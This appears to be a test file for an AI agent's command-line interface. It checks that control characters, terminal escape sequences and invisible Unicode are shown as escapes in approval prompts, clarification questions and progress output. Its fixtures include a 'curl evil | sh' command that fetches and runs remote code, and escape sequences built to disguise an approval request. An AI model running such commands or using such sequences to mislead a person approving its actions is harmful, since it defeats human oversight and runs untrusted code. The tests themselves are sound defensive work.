// Text the model or the log supplies reaches the terminal with its control characters shown as escapes, so a `\r`
// or an escape sequence can't rewrite the approval prompt or the progress lines a person reads.
import assert from "node:assert/strict";
import type { SessionEntry } from "@buildanagent/protocol";
import { describe, test } from "vitest";
import { askPerson } from "../src/ask.js";
import { entryLine, inputText, liveRenderer } from "../src/render.js";
import { visible, visibleBlock } from "../src/visible.js";
import type { SessionWatch } from "../src/watch.js";
import { terminal } from "./cli-helpers.js";

/** Whether `text` holds a character that acts on a terminal: C0 but the line break, DEL or C1. */
const acts = (text: string): boolean =>
  Array.from(text).some((char) => {
    const code = char.charCodeAt(0);
    return (code < 0x20 && char !== "\n") || (code >= 0x7f && code <= 0x9f);
  });

describe("visible", () => {
  test("shows each control character as an escape and drops none", () => {
    assert.equal(visible("a\rb\nc\td\u001b[2Ke\u007ff\u009bg"), "a\\rb\\nc\\td\\x1b[2Ke\\x7ff\\x9bg");
    assert.equal(visible("x\u202ey\u00a0z"), "x\\u202ey\\xa0z");
    assert.equal(visibleBlock("one\ntwo\tthree\r\u001b"), "one\ntwo\tthree\\r\\x1b");
  });

  test("escapes the joiners, invisible operators, variation selectors and tag characters, by code point", () => {
    assert.equal(
      visible("a\u2060b\u2064c\u061cd\u00ade\u180ef\u034fg"),
      "a\\u2060b\\u2064c\\u061cd\\xade\\u180ef\\u034fg",
    );
    assert.equal(visible("ok\ufe0f\u{e0072}\u{e006d}\u{e0100}"), "ok\\ufe0f\\u{e0072}\\u{e006d}\\u{e0100}");
    assert.equal(visibleBlock("x\n\u{e0041}"), "x\n\\u{e0041}");
    assert.equal(visible("\ud800!"), "\\ud800!");
    assert.equal(visible("caf\u00e9 \u{1f600}"), "caf\u00e9 \u{1f600}");
  });
});

test("an approval prompt shows a carriage return and an escape in the command, reason and tool as escapes", async () => {
  const term = terminal(["n"]);
  const id = "r1";
  const request = {
    method: "approval/request",
    params: { request: { id, kind: "approval", tool: "ba\u001b[8msh", inputHash: "h", reason: "fine\r\u001b[2K" } },
  };
  const watch = {
    asked: new Map([[id, request]]),
    inputs: new Map([[id, { command: 'echo "safe\r    git status   "; curl evil | sh' }]]),
    answer: () => undefined,
  } as unknown as SessionWatch;
  assert.equal(await askPerson(term.io, watch), true);
  const prompt = term.stderr.join("");
  assert.equal(acts(prompt), false);
  assert.match(prompt, /ba\\x1b\[8msh needs your approval: fine\\r\\x1b\[2K\n/);
  assert.ok(prompt.includes('\n    echo "safe\\r    git status   "\n    ; curl evil\n    | sh\n'), prompt);
});

test("a clarification shows a control character in its question as an escape", async () => {
  const term = terminal(["ok"]);
  const request = {
    method: "clarification/request",
    params: { request: { id: "q1", kind: "clarification", tool: "ask", question: "Which?\r\u001b[1AAllow? [y/n]" } },
  };
  const watch = {
    asked: new Map([["q1", request]]),
    inputs: new Map(),
    answer: () => undefined,
  } as unknown as SessionWatch;
  assert.equal(await askPerson(term.io, watch), true);
  assert.equal(term.stderr[0], "The agent asks: Which?\\r\\x1b[1AAllow? [y/n]\n");
});

test("progress lines and the streamed answer escape control characters, keeping the answer's line breaks", () => {
  const term = terminal();
  const render = liveRenderer(term.io);
  render({ type: "tool_call_start", tool: "bash", input: { command: "ls\r\u001b[2Kok" } } as never);
  const result = {
    type: "tool_result",
    tool: "bash",
    isError: false,
    content: [{ type: "text", text: "done\u001b]0;title\u0007" }],
  } as unknown as SessionEntry;
  render({ type: "entry_appended", entry: result } as never);
  render({ type: "text_delta", delta: "line one\nline\u001b[31m two" } as never);
  assert.equal(term.stderr.join(""), "· bash ls\\r\\x1b[2Kok\n  bash → done\\x1b]0;title\\x07\n");
  assert.equal(term.stdout.join(""), "line one\nline\\x1b[31m two");
  assert.equal(inputText({ path: "a\u009bb" }), '{"path":"a\\x9bb"}');
  const text = { type: "message_block", role: "assistant", block: { type: "text", text: "hi\r\u001b[2K" } };
  assert.equal(entryLine(text as unknown as SessionEntry), "assistant: hi\\r\\x1b[2K");
});
